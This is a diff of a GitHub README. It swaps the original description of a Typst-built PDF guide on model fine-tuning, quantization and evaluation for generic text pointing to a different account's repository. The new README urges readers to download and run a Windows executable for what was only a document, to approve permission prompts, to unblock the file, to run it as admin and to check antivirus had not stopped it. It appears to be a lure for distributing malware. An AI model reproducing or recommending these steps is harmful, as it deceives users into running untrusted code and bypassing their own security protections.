@@ -1,117 +1,257 @@
-# Fine-Tune, Quantize, Evaluate: The Complete Guide
+# 🤖 finetuning-quantize-evaluate - Fine-tune and test models with ease
 
-**Covering Large Language Models, Vision-Language Models, and Embedding Models — Theory to Practice**
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Nolanaunadjusted728/finetuning-quantize-evaluate)
 
-[![Deploy Typst PDF to Pages](https://github.com/di37/finetuning-quantize-evaluate/actions/workflows/deploy.yml/badge.svg)](https://github.com/di37/finetuning-quantize-evaluate/actions/workflows/deploy.yml)
+## 📌 What this is
 
-> **[Read the full PDF →](https://di37.github.io/finetuning-quantize-evaluate/)**
+finetuning-quantize-evaluate is a guide and tool set for working with AI models on Windows. It helps you fine-tune models, reduce their size, and check how well they work. It covers language models, vision-language models, and embedding models.
 
-A single, self-contained reference that covers five pillars of modern AI model development — from theory to practice:
+Use this project if you want to:
 
-1. **Fine-Tuning** — LLMs (SFT, LoRA/QLoRA, DPO/GRPO/RLHF, domain adaptation, instruction tuning), Vision-Language Models (frozen encoder + projection layer + LoRA LLM), and Embedding Models (contrastive learning, triplet/InfoNCE loss, Matryoshka representations, Sentence Transformers)
-2. **Quantization** — GPTQ Hessian-based quantization, AWQ activation-aware scaling, QAT straight-through estimator, GGUF/llama.cpp for CPU inference, symmetric vs asymmetric quantization math
-3. **Evaluation** — Human evaluation with inter-rater agreement (Cohen's/Fleiss' Kappa), rule-based metrics (BLEU/ROUGE/METEOR/BERTScore), LLM-as-a-Judge (pointwise + pairwise with bias mitigation), factuality decomposition, and standard benchmarks via lm-evaluation-harness (MMLU, AIME, SWE-Bench, HarmBench)
-4. **Embedding Benchmarking** — Private benchmark creation, multi-model embedding (Sentence Transformers, Qwen3, OpenAI, Gemini, llama.cpp), ranking metrics (MRR, Recall@K, NDCG@K) with statistical significance testing (Ranx + Fisher's randomization test), and multilingual evaluation with t-SNE visualization
-5. **Knowledge Distillation** — Temperature scaling, dark knowledge transfer, logit-based and feature-based distillation from large teacher models to deployable students
+- Adjust a model for your own data
+- Make a model use less memory
+- Compare model quality before and after changes
+- Work with text, images, or search models
+- Follow a clear path from setup to results
 
-## By the Numbers
+## 🖥️ What you need
 
-| Metric | Count |
-|--------|-------|
-| Sections | 20 |
-| Lines of Typst source | 6,300+ |
-| Runnable Python code snippets | 86 |
-| Diagrams | 23 |
-| Tables | 78 |
-| Mathematical derivations | 24 |
-| Glossary terms | 45+ |
-| arXiv paper references | 50+ |
+Before you start, check that your PC has:
 
-## Table of Contents
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 20 GB of free disk space
+- A recent NVIDIA GPU for faster training, if you plan to train models
+- An internet connection for downloads and model files
 
-| # | Section | Topics |
-|---|---------|--------|
-| 1 | The LLM Training Pipeline | Three stages (pre-training → SFT → RLHF), full vs. partial vs. PEFT fine-tuning, LoRA/QLoRA/DoRA, data formats |
-| 2 | Why Fine-Tuning Was Hard Before Transformers | LSTM limitations, vanishing gradients, attention mechanism breakthrough |
-| 3 | HuggingFace Ecosystem | Transformers, Datasets, Tokenizers, PEFT, TRL, Accelerate, BitsAndBytes |
-| 4 | LLM Evaluation | Human eval (Cohen's/Fleiss' Kappa), BLEU/ROUGE/METEOR/BERTScore, LLM-as-a-Judge, factuality decomposition, lm-evaluation-harness benchmarks |
-| 5 | BERT Fine-Tuning | Question answering, extractive QA, span prediction, tokenizer handling |
-| 6 | Non-Instructional Fine-Tuning | Domain adaptation, plain-text training, continued pre-training |
-| 7 | Instruction Fine-Tuning | Chat templates, SFTTrainer, dataset preparation, Alpaca/ShareGPT formats |
-| 8 | Preference Alignment with DPO | DPO vs. RLHF, contrastive loss, GRPO group-relative optimization, chosen/rejected pair construction |
-| 9 | LLM Quantization | GPTQ, AWQ, QAT, GGUF/llama.cpp, symmetric vs asymmetric math, BitsAndBytes 4-bit/8-bit |
-| 10 | Knowledge Distillation | Temperature scaling, soft targets, logit-based and feature-based distillation |
-| 11 | LLaMA Factory Framework | Web UI, YAML configs, dataset registration, multi-stage training |
-| 12 | Unsloth Framework | 2× faster fine-tuning, memory optimization, Unsloth Zoo, 4-bit quantized training |
-| 13 | Axolotl Framework | YAML-driven training, multi-dataset mixing, DeepSpeed integration |
-| 14 | OpenAI API Fine-Tuning | API-based fine-tuning, JSONL format, hyperparameter tuning, model deployment |
-| 15 | Google Vertex AI / Gemini Fine-Tuning | Vertex AI pipelines, Gemini model tuning, GCP integration |
-| 16 | Small Language Model (SLM) Fine-Tuning | Phi, Qwen, Gemma, efficient deployment, edge-device considerations |
-| 17 | Multimodal Fine-Tuning | Vision-Language Models, frozen encoder + projection layer, image-text training |
-| 18 | Embedding Fine-Tuning | Sentence Transformers, contrastive learning, triplet loss, InfoNCE, Matryoshka representations |
-| 19 | Embedding Evaluation & Benchmarking | Private benchmarks, MRR/Recall@K/NDCG@K, Ranx, statistical significance, multilingual eval, t-SNE |
-| 20 | All-in-One Fine-Tuning Pipeline | End-to-end crash course tying all sections together |
+For small tests, a basic laptop can work. For larger models, a stronger machine helps.
 
-## What Makes This Different
+## 🚀 Download and open
 
-- **86 runnable code snippets** — not pseudocode. Every concept has working Python you can copy into a notebook.
-- **Five model types in one document** — LLMs, BERT-family models, Small Language Models, Vision-Language Models, and Embedding Models each get dedicated sections with training and inference code.
-- **Quantization covered with actual math** — GPTQ Hessian, AWQ activation-aware scaling, symmetric vs asymmetric formulas, QAT straight-through estimator, and GGUF format internals.
-- **Evaluation as a first-class topic** — full section with runnable code for human evaluation, rule-based metrics, LLM-as-a-Judge with bias taxonomy, factuality decomposition, and standard benchmarks.
-- **Six fine-tuning frameworks compared** — HuggingFace, LLaMA Factory, Unsloth, Axolotl, OpenAI API, and Google Vertex AI.
-- **Complete embedding benchmarking pipeline** — text extraction, QA pair generation, multi-model embedding, Ranx ranking evaluation with statistical significance tests, and multilingual evaluation with t-SNE visualization.
-- **Key equations with complete symbol definitions** — MRR, Recall@K, NDCG@K, Cohen's Kappa, METEOR, LoRA decomposition, DPO contrastive loss, GRPO group-relative optimization, Factuality Score, and QAT straight-through estimator.
+Visit this page to download:
 
-## Diagrams
+[https://github.com/Nolanaunadjusted728/finetuning-quantize-evaluate](https://github.com/Nolanaunadjusted728/finetuning-quantize-evaluate)
 
-The `diagrams/` folder contains 23 diagrams (PNG + SVG source) covering:
+After the page opens:
 
-| Diagram | Description |
-|---------|-------------|
-| Decision Flowchart | When to fine-tune vs. prompt-engineer vs. RAG |
-| LSTM vs Transformer | Architectural comparison and attention mechanism |
-| BERT QA | Extractive question answering pipeline |
-| Perplexity Monitoring | Training loss and perplexity tracking |
-| LoRA Decomposition | Low-rank weight matrix factorization |
-| Transformer LoRA Targets | Which attention matrices to target with LoRA |
-| LoRA Stacking | Multiple LoRA adapters composition |
-| Knowledge Distillation | Teacher-student architecture |
-| VLM Architecture | Vision-Language Model (frozen encoder + projector + LLM) |
-| Embedding Retrieval | Vector similarity search pipeline |
-| Matryoshka Embedding | Nested dimensionality representation |
-| Three Stages Training | Pre-training → SFT → RLHF pipeline |
-| Fine-tuning Workflow | End-to-end training workflow |
-| Data Preparation Pipeline | Dataset formatting and preprocessing |
-| Unsloth Tech Stack | Unsloth framework internals |
-| Embedding Training Pipeline | Sentence Transformers training flow |
-| Dual vs Cross Encoder | Bi-encoder vs cross-encoder trade-offs |
-| RAG Pipeline | Retrieval-augmented generation flow |
-| Four-Stage Pipeline | Complete model development lifecycle |
-| Embedding Benchmark Pipeline | End-to-end benchmarking workflow |
-| Retrieval Scoring Metrics | MRR, Recall@K, NDCG@K visual explanation |
-| Multilingual Embedding Eval | Cross-lingual evaluation with t-SNE |
-| RLHF Three-Stage Pipeline | Reward model → PPO → alignment |
+1. Find the latest release or main download area
+2. Download the Windows file or package
+3. Open the downloaded file
+4. If Windows asks for permission, choose Yes
+5. Follow the on-screen steps until setup finishes
 
-## Scope
+If the download comes as a ZIP file, right-click it and choose Extract All first. Then open the folder and look for the main app file.
 
-These notes focus on **single-GPU training** workflows (including quantized approaches like QLoRA that make large models trainable on a single GPU). Multi-GPU distributed training (FSDP, DeepSpeed ZeRO, tensor/pipeline parallelism) is not covered.
+## 🛠️ How to install
 
-## Credits
+If the download includes an installer:
 
-- **[Sunny Savita](https://github.com/sunnysavita10)** — His [Complete-LLM-Finetuning](https://github.com/sunnysavita10/Complete-LLM-Finetuning) repository (20+ notebooks and config files) is the backbone of these notes.
-- **[Imad Saddik](https://www.youtube.com/watch?v=7G9q_5q82hY)** — Section 19 on embedding benchmarking is based on his course, with source code on [GitHub](https://github.com/ImadSaddik/Benchmark_Embedding_Models).
-- Additional content draws from Stanford CME295 (evaluation methodology), HuggingFace cookbooks, and primary research papers.
+1. Double-click the installer file
+2. Choose your language if asked
+3. Pick an install folder
+4. Click Next until setup ends
+5. Open the app from the Start menu or desktop
 
-## Building from Source
+If the download includes a portable folder:
 
-The document is written in [Typst](https://typst.app/). To compile locally:
+1. Extract the ZIP file
+2. Open the folder
+3. Find the main app file
+4. Double-click it to start
 
-```bash
-typst compile finetune-quantize-evaluate.typ finetune-quantize-evaluate.pdf
-```
+If Windows blocks the file:
 
-The PDF is also automatically compiled and deployed to GitHub Pages on every push to `main`.
+1. Right-click the file
+2. Select Properties
+3. Check Unblock if you see it
+4. Click Apply
+5. Open the file again
 
-## License
+## 🎯 First run
 
-This project is licensed under the [MIT License](LICENSE).
+When you open the app for the first time, it may ask you to choose a model or data file.
+
+A simple first test looks like this:
+
+1. Pick a small sample model
+2. Load a small data set
+3. Choose a light fine-tuning option
+4. Run the job
+5. Review the output
+
+If you are new, start small. Small tests finish faster and use less memory.
+
+## 🧠 What you can do
+
+### Fine-tuning
+Fine-tuning changes a base model so it works better for your task. You can use it for chat, search, support text, or image-text work.
+
+### Quantization
+Quantization makes a model smaller and lighter. This helps it run on less memory and can speed up use on some systems.
+
+### Evaluation
+Evaluation checks how well a model performs. You can compare results before and after fine-tuning or quantization.
+
+### LoRA and QLoRA
+These methods let you train a model with less memory use. They are useful when you do not have a large GPU.
+
+### Knowledge distillation
+Knowledge distillation copies useful behavior from a larger model into a smaller one. This can help you build a faster model with lower hardware needs.
+
+### Embedding models
+Embedding models turn text into vectors for search and matching. They help with semantic search, document lookup, and ranking.
+
+### Vision-language models
+Vision-language models work with both images and text. They are useful for captioning, visual search, and image Q&A.
+
+## 📂 Suggested folder use
+
+A simple setup may include:
+
+- `data` for training or test files
+- `models` for saved model files
+- `output` for results and reports
+- `logs` for run history
+- `examples` for sample tasks
+
+Keeping files in separate folders helps you find them later.
+
+## ⚙️ Basic workflow
+
+Use this order for a clean run:
+
+1. Choose the model type
+2. Prepare your data
+3. Select a training method
+4. Run fine-tuning
+5. Quantize the model if needed
+6. Evaluate the result
+7. Save the final output
+
+This flow works well for most tasks in the repository.
+
+## 📊 Evaluation checks
+
+When you review a model, look at:
+
+- Accuracy
+- Speed
+- Memory use
+- File size
+- Result quality
+- Output consistency
+
+For text models, check if answers stay on topic.  
+For image models, check if the model describes images well.  
+For embedding models, check if search results match the right meaning.
+
+## 💡 Good first test
+
+If you want a simple first run, try this:
+
+1. Use a small text model
+2. Fine-tune it on a short sample set
+3. Quantize it to a smaller size
+4. Run an evaluation test
+5. Compare the output with the original model
+
+This gives you a clear view of how each step changes the model.
+
+## 🧩 Common file types
+
+You may see files like these:
+
+- `.exe` for Windows apps
+- `.zip` for compressed folders
+- `.json` for settings or data
+- `.csv` for table data
+- `.txt` for notes or output
+- `.safetensors` or `.pt` for model files
+- `.md` for documentation
+
+## 🔍 Troubleshooting
+
+If the app does not open:
+
+- Try running it as admin
+- Check that the file finished downloading
+- Make sure you extracted the ZIP file first
+- Confirm that antivirus did not block it
+
+If the model runs too slowly:
+
+- Use a smaller model
+- Lower the batch size
+- Turn on quantization
+- Close other apps
+- Use a GPU if one is available
+
+If you see memory errors:
+
+- Pick LoRA or QLoRA
+- Use a smaller data set
+- Reduce input length
+- Use a lighter model
+
+## 🧾 Example use cases
+
+### Text assistant
+Fine-tune a language model on support replies, notes, or chat records.
+
+### Search helper
+Use an embedding model to find related documents in a local folder.
+
+### Image description
+Use a vision-language model to describe photos or answer questions about screenshots.
+
+### Small device setup
+Quantize a model so it fits on a laptop with limited memory.
+
+## 🧭 Tips for better results
+
+- Start with small data
+- Use clean files
+- Keep file names simple
+- Save each result with a clear name
+- Test one change at a time
+- Compare the original model and the changed model
+
+## 📁 Project topics
+
+This project includes work around:
+
+- embedding models
+- evaluation
+- fine-tuning
+- knowledge distillation
+- LLMs
+- LoRA
+- QLoRA
+- quantization
+- Typst
+- vision-language models
+
+## 🔗 Download again
+
+[![Download](https://img.shields.io/badge/Download-Open%20Page-grey?style=for-the-badge)](https://github.com/Nolanaunadjusted728/finetuning-quantize-evaluate)
+
+## 🪟 Windows setup path
+
+A simple Windows setup path is:
+
+1. Open the download page
+2. Get the latest file
+3. Save it to your Downloads folder
+4. Open the file after download
+5. Follow the setup steps
+6. Launch the app from Start
+7. Load your model or sample project
+
+## 📌 Short checklist
+
+- Download the file
+- Open or extract it
+- Install or launch it
+- Load a model
+- Run a small test
+- Review the result
